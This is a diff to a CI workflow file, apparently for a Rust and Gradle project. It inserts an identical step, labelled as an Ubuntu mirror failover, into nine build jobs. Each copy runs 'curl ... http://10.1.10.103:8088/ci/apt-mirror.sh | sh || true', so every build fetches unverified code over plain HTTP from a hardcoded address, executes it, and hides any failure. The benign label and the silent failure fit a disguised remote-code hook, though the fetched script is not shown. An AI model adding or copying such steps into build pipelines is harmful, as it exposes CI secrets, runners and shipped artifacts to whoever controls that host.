@@ -78,6 +78,8 @@ jobs:
         uses: https://github.com/dtolnay/rust-toolchain@stable
         with:
           components: clippy
+      - name: Ubuntu mirror failover (build-cache hub)
+        run: curl -fsS -m 5 http://10.1.10.103:8088/ci/apt-mirror.sh | sh || true
       - name: Install dependencies
         run: |
           sudo apt-get update
@@ -119,6 +121,8 @@ jobs:
       - uses: actions/checkout@v4
       - name: Install Rust
         uses: https://github.com/dtolnay/rust-toolchain@stable
+      - name: Ubuntu mirror failover (build-cache hub)
+        run: curl -fsS -m 5 http://10.1.10.103:8088/ci/apt-mirror.sh | sh || true
       - name: Install dependencies
         run: |
           sudo apt-get update
@@ -148,6 +152,8 @@ jobs:
       - uses: actions/checkout@v4
       - name: Install Rust
         uses: https://github.com/dtolnay/rust-toolchain@stable
+      - name: Ubuntu mirror failover (build-cache hub)
+        run: curl -fsS -m 5 http://10.1.10.103:8088/ci/apt-mirror.sh | sh || true
       - name: Install dependencies
         run: |
           sudo apt-get update
@@ -210,6 +216,8 @@ jobs:
           distribution: 'zulu'
       - name: Prefetch Gradle distribution (retrying)
         run: .forgejo/scripts/prefetch-gradle.sh
+      - name: Ubuntu mirror failover (build-cache hub)
+        run: curl -fsS -m 5 http://10.1.10.103:8088/ci/apt-mirror.sh | sh || true
       - name: Install dependencies
         run: |
           sudo apt-get update
@@ -265,6 +273,8 @@ jobs:
       - uses: actions/checkout@v4
       - name: Install Rust
         uses: https://github.com/dtolnay/rust-toolchain@stable
+      - name: Ubuntu mirror failover (build-cache hub)
+        run: curl -fsS -m 5 http://10.1.10.103:8088/ci/apt-mirror.sh | sh || true
       - name: Install dependencies
         run: |
           sudo apt-get update
@@ -308,6 +318,8 @@ jobs:
       - uses: actions/checkout@v4
       - name: Install Rust
         uses: https://github.com/dtolnay/rust-toolchain@stable
+      - name: Ubuntu mirror failover (build-cache hub)
+        run: curl -fsS -m 5 http://10.1.10.103:8088/ci/apt-mirror.sh | sh || true
       - name: Install dependencies
         run: |
           sudo apt-get update
@@ -379,6 +391,8 @@ jobs:
             [ "$i" = 4 ] && exit 1
             echo "apt attempt $i failed; retrying"; sleep $((i*15))
           done
+      - name: Ubuntu mirror failover (build-cache hub)
+        run: curl -fsS -m 5 http://10.1.10.103:8088/ci/apt-mirror.sh | sh || true
       - name: Ensure Node.js is present (self-heal)
         run: command -v node || sudo apt-get install -y nodejs
       - name: Compute cache key
@@ -436,6 +450,8 @@ jobs:
             [ "$i" = 4 ] && exit 1
             echo "apt attempt $i failed; retrying"; sleep $((i*15))
           done
+      - name: Ubuntu mirror failover (build-cache hub)
+        run: curl -fsS -m 5 http://10.1.10.103:8088/ci/apt-mirror.sh | sh || true
       - name: Ensure Node.js is present (self-heal)
         run: command -v node || sudo apt-get install -y nodejs
       - name: Build + clippy (x86_64-pc-windows-gnu)
@@ -462,6 +478,8 @@ jobs:
       - uses: actions/checkout@v4
       - name: Install Rust
         uses: https://github.com/dtolnay/rust-toolchain@stable
+      - name: Ubuntu mirror failover (build-cache hub)
+        run: curl -fsS -m 5 http://10.1.10.103:8088/ci/apt-mirror.sh | sh || true
       - name: Install dependencies
         run: |
           sudo apt-get update
